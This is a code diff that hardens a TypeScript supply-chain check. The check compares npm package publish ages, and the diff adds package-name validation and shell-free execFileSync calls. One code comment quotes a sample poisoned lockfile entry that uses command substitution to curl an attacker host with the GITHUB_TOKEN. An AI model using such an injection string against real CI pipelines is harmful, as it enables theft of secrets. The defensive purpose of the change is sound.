@@ -19,7 +19,7 @@
  * Adding a minimum age quarantine catches this class of supply chain attack.
  */
 
-import { execSync } from "node:child_process";
+import { execFileSync, execSync } from "node:child_process";
 import { readFileSync, accessSync } from "node:fs";
 import { join } from "node:path";
 
@@ -101,14 +101,42 @@ console.log(`Checking publish age of ${changed.length} changed package(s)...`);
 
 // --- Query publish dates ---
 
+// Reject anything that doesn't look like a normal npm package name before we
+// hand it to the registry. Real names match `[@scope/]name` with lowercase
+// letters, digits, dots, dashes, and underscores. Anything else is either a
+// broken lockfile or a lockfile-poisoning attempt — bail rather than ask the
+// registry (or, worse, a shell). The pattern is anchored on both sides and
+// each `[…]*` quantifier consumes a disjoint character class from its
+// neighbour, so there's no backtracking explosion — eslint-plugin-security's
+// `detect-unsafe-regex` flags this as a false positive.
+// eslint-disable-next-line security/detect-unsafe-regex
+const NPM_NAME_RE = /^(?:@[a-z0-9][a-z0-9._-]*\/)?[a-z0-9][a-z0-9._-]*$/i;
+
 async function getPublishDate(name: string, version: string): Promise<Date | null> {
-  // npm view — respects .npmrc, private registries
+  if (!NPM_NAME_RE.test(name)) {
+    console.warn(`  Skipping suspicious package name: ${JSON.stringify(name)}`);
+    return null;
+  }
+  // npm view — respects .npmrc, private registries.
+  // execFileSync (not execSync) so the package name is an argv entry and
+  // never goes through a shell. A poisoned lockfile entry like
+  //   "node_modules/$(curl attacker.com/exfil?t=$GITHUB_TOKEN)"
+  // would otherwise be expanded by bash when execSync runs the command
+  // string in CI and exfiltrate the GITHUB_TOKEN. With execFile the name
+  // never reaches a shell parser at all (and the regex above rejects it
+  // before we even get here).
+  // Windows: npm is `npm.cmd`, and Node ≥ 22 refuses to spawn .cmd files
+  // without `shell: true`. Set shell on Windows only — Node still escapes
+  // the argv array against CVE-2024-27980 in that mode, so the name can't
+  // sneak metacharacters into the cmd.exe invocation.
+  const isWindows = process.platform === "win32";
   try {
-    const out = execSync(`npm view "${name}" time --json`, {
+    const out = execFileSync("npm", ["view", name, "time", "--json"], {
       cwd,
       encoding: "utf8",
       timeout: 15_000,
       stdio: ["pipe", "pipe", "pipe"],
+      shell: isWindows,
     });
     const timeObj = JSON.parse(out) as Record<string, string>;
     if (typeof timeObj === "object" && timeObj[version]) {
